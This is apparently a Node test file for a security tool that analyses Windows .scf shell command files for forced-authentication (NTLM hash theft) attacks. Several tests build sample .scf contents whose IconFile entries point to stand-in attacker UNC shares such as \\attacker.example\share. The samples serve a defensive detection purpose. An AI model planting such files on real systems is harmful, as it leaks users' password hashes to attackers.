'use strict';
// scf-renderer.test.js — Windows Explorer Command (.scf) analyser.
//
// .scf is a tiny INI-format shell command file. The threat model is
// ATT&CK T1187 (Forced Authentication / NTLM hash theft) via
// `IconFile=\\attacker\share` — Windows Explorer auto-resolves the
// icon when rendering the parent folder, leaking the user's NTLMv2
// hash to the attacker SMB host without any user interaction.
//
// These tests verify:
//   • Format banner is always emitted (medium severity)
//   • UNC IconFile / Command → high severity Pattern + UNC_PATH IOC
//   • HTTP IconFile / Command → medium severity Pattern + URL IOC
//   • Risk calibrates to high when UNC present, medium otherwise
//   • Detections mirror to externalRefs as IOC.PATTERN (renderer contract)
//   • _parseIni handles malformed input without throwing

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

const ctx = loadModules(
  ['src/constants.js', 'src/renderers/scf-renderer.js'],
  { expose: ['ScfRenderer', 'IOC', 'escalateRisk'] },
);
const { ScfRenderer, IOC } = ctx;

function bufFor(text) {
  return new TextEncoder().encode(text).buffer;
}

test('scf: format banner is always emitted', () => {
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor('[Shell]\nCommand=2\n'), 'a.scf');
  const banner = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /Windows Explorer Command/.test(x.url));
  assert.ok(banner, `expected format banner, got: ${JSON.stringify(f.externalRefs)}`);
  assert.equal(banner.severity, 'medium');
});

test('scf: UNC IconFile escalates risk to high', () => {
  const text = '[Shell]\nCommand=2\nIconFile=\\\\attacker.example\\share\\icon.ico\nIconIndex=1\n';
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'evil.scf');
  assert.equal(f.risk, 'high');

  // Pattern detection for T1187 — distinct from the format banner. The
  // banner mentions T1187 too, but at medium severity.
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /UNC path/.test(x.url));
  assert.ok(det, `expected UNC-path detection, got: ${JSON.stringify(f.externalRefs)}`);
  assert.equal(det.severity, 'high');
  assert.equal(det._highlightText, '\\\\attacker.example\\share\\icon.ico');

  // Companion UNC_PATH IOC.
  const unc = f.externalRefs.find(x =>
    x.type === IOC.UNC_PATH && x.url === '\\\\attacker.example\\share\\icon.ico')
    || (f.interestingStrings || []).find(x =>
      x.type === IOC.UNC_PATH && x.url === '\\\\attacker.example\\share\\icon.ico');
  assert.ok(unc, `expected UNC_PATH IOC, got: ${JSON.stringify(f)}`);
  assert.equal(unc.severity, 'high');
});

test('scf: long-form UNC (\\\\?\\UNC\\…) classified as UNC', () => {
  const text = '[Shell]\nCommand=2\nIconFile=\\\\?\\UNC\\attacker\\share\\icon.ico\n';
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'evil.scf');
  assert.equal(f.risk, 'high');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /UNC path/.test(x.url));
  assert.ok(det, 'long-form UNC should fire the UNC-path detection');
  assert.equal(det.severity, 'high');
});

test('scf: HTTP IconFile is medium not high', () => {
  const text = '[Shell]\nCommand=2\nIconFile=https://example.com/icon.ico\n';
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.scf');
  // Risk should be medium (banner medium + http medium, no high).
  assert.equal(f.risk, 'medium');
  assert.ok(!f.externalRefs.some(x => x.severity === 'high'),
    `no high-severity refs expected, got: ${JSON.stringify(f.externalRefs)}`);
});

test('scf: benign IconFile (local path) does NOT escalate', () => {
  const text = '[Shell]\nCommand=2\nIconFile=%SystemRoot%\\System32\\shell32.dll\nIconIndex=1\n';
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.scf');
  // Format banner alone (medium) — no UNC, no http.
  assert.equal(f.risk, 'medium');
  assert.equal(f.externalRefs.filter(x => x.severity === 'high').length, 0);
});

test('scf: detections mirror to externalRefs as IOC.PATTERN', () => {
  // Renderer contract: every Detection-class finding must surface as a
  // Pattern row in externalRefs or it won't appear in Summary/STIX/MISP.
  const text = '[Shell]\nIconFile=\\\\evil.example\\share\\x.ico\n';
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.scf');
  const patterns = f.externalRefs.filter(x => x.type === IOC.PATTERN);
  assert.ok(patterns.length >= 2, `expected ≥2 pattern rows, got ${patterns.length}`);
  assert.ok(patterns.some(p => /Windows Explorer Command/.test(p.url)));
  assert.ok(patterns.some(p => /T1187/.test(p.url)));
});

test('scf: _parseIni handles section headers and key=value', () => {
  const ini = '[Shell]\nCommand=2\nIconFile=foo\n[Other]\nA=B\n';
  const out = ScfRenderer._parseIni(ini);
  // Cross-realm `deepEqual` returns Object-from-different-realm mismatches
  // (see AGENTS.md). Per-key equal works fine.
  assert.equal(out.Shell.Command, '2');
  assert.equal(out.Shell.IconFile, 'foo');
  assert.equal(out.Other.A, 'B');
  assert.equal(Object.keys(out).length, 2);
});

test('scf: _parseIni tolerates malformed input', () => {
  // No throws on garbage. Should return at least an object.
  const out = ScfRenderer._parseIni('not really an ini\nfoo=bar\nbaz\n');
  assert.equal(typeof out, 'object');
  // Top-level keys before any [Section] live under '_'... but we
  // delete that bucket if empty, so depending on input may or may not
  // exist. Just assert no throw.
});

test('scf: keys outside [Shell] still trigger UNC detection', () => {
  // Malformed SCFs without the section header still resolve in Explorer.
  // We deliberately don't require the section anchor.
  const text = 'IconFile=\\\\attacker\\share\\icon.ico\n';
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.scf');
  assert.equal(f.risk, 'high');
});

test('scf: all hits use IOC.* constants (no bare strings)', () => {
  const text = '[Shell]\nIconFile=\\\\evil\\x\\y.ico\nCommand=https://e.example/c\n';
  const r = new ScfRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.scf');
  for (const e of f.externalRefs) {
    assert.ok(typeof e.type === 'string' && e.type.length > 0);
    // Bare strings like 'url' / 'unc' would silently break sidebar/STIX.
    assert.ok(['Pattern', 'URL', 'UNC Path', 'Crypto Address', 'Secret', 'Hostname', 'Domain']
      .includes(e.type), `unexpected bare type: ${e.type}`);
  }
});
